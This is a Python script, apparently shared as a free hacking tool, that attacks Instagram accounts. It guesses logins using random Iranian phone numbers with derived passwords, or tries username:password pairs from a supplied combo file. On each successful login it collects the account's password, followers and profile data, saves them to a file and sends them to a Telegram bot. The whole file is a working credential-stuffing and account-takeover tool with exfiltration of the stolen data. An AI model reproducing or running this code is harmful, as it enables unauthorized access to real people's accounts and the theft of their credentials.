""" 
-------------------------------------------------------------------------
- Cod BY : KHDHER ABASS
- Telegram: https://t.me/khdhe1
- Telegram: https://t.me/khdhe
-------------------------------------------------------------------------
     
""" 
try:
	import  sys, os, random,json,requests,InstagramIG
	from InstagramIG import SidraELEzz
except ImportError as e:
	os.system('pip install requests')
	os.system('pip install InstagramIG')
	

##############(1)###############
#- Cod BY : KHDHER ABASS
#- Telegram: https://t.me/khdhe1
#- Telegram: https://t.me/khdhe
##############(1)###############

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"

os.system('clear')
os.system('rm -rf .txt')

##############(3)###############
#- Cod BY : KHDHER ABASS
#- Telegram: https://t.me/khdhe
#- Telegram: https://t.me/khdhe1
##############(3)###############

Sidra= """ 
   \033[1;92m  _________ __      ___                
   \033[1;97m /   _____/|__|  __| _/_______ _____   
   \033[1;97m \_____  \ |  | / __ | \_  __ \\__  \  
   \033[1;97m /        \|  |/ /_/ |  |  | \/ / __ \_
   \033[1;97m/_______  /|__|\____ |  |__|   (____  /
   \033[1;92m        \/          \/              \/   

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : KHDHER ABASS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : khdhe
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : tuchnica expirt
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
Tk ="""

      \033[1;92m       d8888   8888888b.   8888888 
      \033[1;97m      d88888   888   Y88b    888   
      \033[1;92m     d88P888   888    888    888   
      \033[1;97m    d88P 888   888   d88P    888   
      \033[1;92m   d88P  888   8888888P"     888   
      \033[1;97m  d88P   888   888           888   
      \033[1;92m d8888888888   888           888   
      \033[1;97md88P     888   888         8888888

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >\033[1;91m  • \033[1;92mversion2.0\033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : KHDHER ABASS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : khdhe
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : djdjf
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDR\n                                                    
"""     
Tik ="""

      \033[1;92m       d8888   8888888b.   8888888 
      \033[1;97m      d88888   888   Y88b    888   
      \033[1;92m     d88P888   888    888    888   
      \033[1;97m    d88P 888   888   d88P    888   
      \033[1;92m   d88P  888   8888888P"     888   
      \033[1;97m  d88P   888   888           888   
      \033[1;92m d8888888888   888           888   
      \033[1;97md88P     888   888         8888888

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >\033[1;91m  • \033[1;92mversion2.0\033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : KHDHER ABASS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : khdhe1
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : 
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDR  \033[1;91m 
----------------------------------
 \033[1;91m(\033[1;92m1\033[1;91m) \033[1;90m\033[1;97m CHECKER IRAN
 \033[1;91m(\033[1;92m2\033[1;91m) \033[1;90m\033[1;97m CHECKER COMBO
 \033[1;91m(\033[1;92m0\033[1;91m) \033[1;90m\033[1;91m EXIT  
"""
##############(4)###############
#- Cod BY : KHDHER ABASS
#- Github : https://github.com/khdhe
#- Telegram: https://t.me/khdhe1
#- Telegram: https://t.me/khdhe
##############(4)###############

print(Sidra)
token = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " Enter ID Tele :\n"+C)
send_message= ("⌯ Welcome to the Instagram Random Account Checker Bot •\n\n⌯ Tele : @khdhe1\n. — — — — —  — — — — — . \n⌯To Start The scan Press /start\n")
message = requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(send_message)).json()
id_message = str(message['result']["message_id"])
os.system('clear')
print(Tik)
API = input(A+" ("+E+"⌯"+A+")"+B+ " CHOOSE AN OPTION : "+C)

##############(5)###############
#- Cod BY : KHDHER ABA.                                    
#- Github : https://github.com/.  
#- Telegram: https://t.me/khdhe.           
#- Telegram: https://t.me/khdhe1.                      
##############(5)###############
if str(API) == "1":
	print('\033[1;94m ---------------------------') 
	ok = 0
	cp = 0
	sk = 0
	CH ="12345678900987654321"
	
	while True:
		BT = str(''.join((random.choice(CH) for i in range(7))))
		username = "+98930"+str(BT)
		password = "0930"+str(BT)
		try:
			Logan = SidraELEzz.Instalogin(str(username),str(password))
			if (Logan) ==True:
				sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
				try:user = SidraELEzz.username(str(sessionid))
				except:pass
				followers = SidraELEzz.followers(str(user))
				following = SidraELEzz.following(str(user))
				post = SidraELEzz.posts(str(user))
				id = SidraELEzz.id(str(user))
				name = SidraELEzz.name(str(user))
				deat = SidraELEzz.data(str(user))
				Sidraok = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ɴᴀᴍᴇ : "+str(name)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(following)+"\n‹ ᴅᴀᴛᴀ  : "+str(deat)+" \n.— — — — —  — — — — — . \n")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
				with open("OK.txt",'a') as m :
					m.write(Sidraok+"\n")
				ok+=1
				
					
			
			elif (Logan) ==False:
				Sidracp = ("")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
				cp+=1
				
			elif (Logan) ==None:
				sk+=1
				Sidrask=("‹  ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n\n‹ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀɴ 🇮🇷\n. — — — — —  — — — — — . \n‹ ɢᴏᴏᴅ : "+str(ok)+"\n‹ ʙᴀɴᴅ : "+str(cp)+"\n‹ ᴛᴇѕᴛ  : "+str(sk)+"\n‹ ᴜѕᴇʀ :"+str(username)+"\n. — — — — —  — — — — — . \n")
				requests.get("https://api.telegram.org/bot"+str(token)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_message)+"&text="+str(Sidrask))
				
				
		except:pass
		
##############(6)###############
#- Cod BY : khdher abass
#- Github : https://github.com/SidraE
#- Telegram: https://t.me/khdhe
#- Telegram: https://t.me/khdhe1
##############(6)###############

if str(API) == "2":
	try:
		os.system('clear')
		print(Tk)
		fil= input(A+" ("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
		print('\033[1;94m ---------------------------') 
	except:
		print("\n Error !!!!!!!!!")
		os.sys.exit()
	
	ok = 0
	cp = 0
	sk = 0
	file = open(fil, 'r')	
	while True:
		BT=file.readline().split('\n')[0]
		if BT == '':
			print(A+"The examination has been completed.   "+E+fil)
			break
		username = BT.split(':')[0]
		password = BT.split(':')[1]
		try:
			Logan = SidraELEzz.Instalogin(str(username),str(password))
			if (Logan) ==True:
				sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
				try:user = SidraELEzz.username(str(sessionid))
				except:pass
				followers = SidraELEzz.followers(str(user))
				following = SidraELEzz.following(str(user))
				post = SidraELEzz.posts(str(user))
				id = SidraELEzz.id(str(user))
				name = SidraELEzz.name(str(user))
				deat = SidraELEzz.data(str(user))
				Sidraok = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ɴᴀᴍᴇ : "+str(name)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(following)+"\n‹ ᴘᴏѕᴛ : "+str(post)+"\n‹ ɪᴅ : "+str(id)+"\n‹ ᴅᴀᴛᴀ  : "+str(deat)+"\n‹ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀɴ 🇮🇷 \n.— — — — —  — — — — — . \n")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
				with open("OK.txt",'a') as m :
					m.write(Sidraok+"\n")
				ok+=1
				
					
			
			elif (Logan) ==False:
				Sidracp = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ 🔐\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(username)+"\n\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n. — — — — —  — — — — — . \n• @khdhe1")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
				cp+=1
				
			elif (Logan) ==None:
				sk+=1
				Sidrask=("‹  ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n\n. — — — — —  — — — — — . \n‹ ɢᴏᴏᴅ : "+str(ok)+"\n‹ ʙᴀɴᴅ : "+str(cp)+"\n‹ ᴛᴇѕᴛ  : "+str(sk)+"\n‹ ᴜѕᴇʀ :"+str(username)+"\n. — — — — —  — — — — — . \n• @khdhe1")
				requests.get("https://api.telegram.org/bot"+str(token)+"/editmessagetext?chat_id="+str(ID)+"&message_id="+str(id_message)+"&text="+str(Sidrask))
				
				
		except:pass
		#print (E+"\nThanks........")
		
		
		
		
 
	
""" 
-------------------------------------------------------------------------
- Cod BY : khdher abass
- Github : https://github.com/SidraEL
- Telegram: https://t.me/khdhe
- Telegram: https://t.me/khdhe1
-------------------------------------------------------------------------
     
""" 
		

